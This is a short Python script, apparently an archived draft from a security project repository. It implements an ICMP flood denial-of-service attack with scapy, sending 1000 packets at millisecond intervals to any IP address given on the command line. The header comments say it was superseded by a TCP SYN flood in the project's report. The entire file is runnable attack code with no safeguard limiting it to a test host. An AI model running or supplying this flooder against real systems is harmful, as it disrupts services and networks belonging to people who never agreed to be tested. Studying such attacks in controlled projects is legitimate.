# NOTE: earlier draft for the DoS attack. The final documented attack in
# docs/report.md uses a TCP SYN flood instead (see src/dos/tcp_syn_flood.py).
# Kept here for transparency / project history.
# The original ICMP payload string was replaced with a generic placeholder
# as part of removing personal references before publishing this repo.

from scapy.all import *
from scapy.layers.inet import IP


logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def icmp_flood(target_ip):
    print(f"ICMP flood for '{target_ip}'")

    icmp_packet = IP(dst=target_ip) / ICMP() / "ICMP flood test payload"

    send(icmp_packet, inter=0.001, count=1000)
    print("ICMP flood is complete!")


def main() -> None:
    if len(sys.argv) != 2:
        print("Usage: %s target" % (sys.argv[0]))
        sys.exit(0)

    target = str(sys.argv[1])
    icmp_flood(target)


if __name__ == "__main__":
    main()
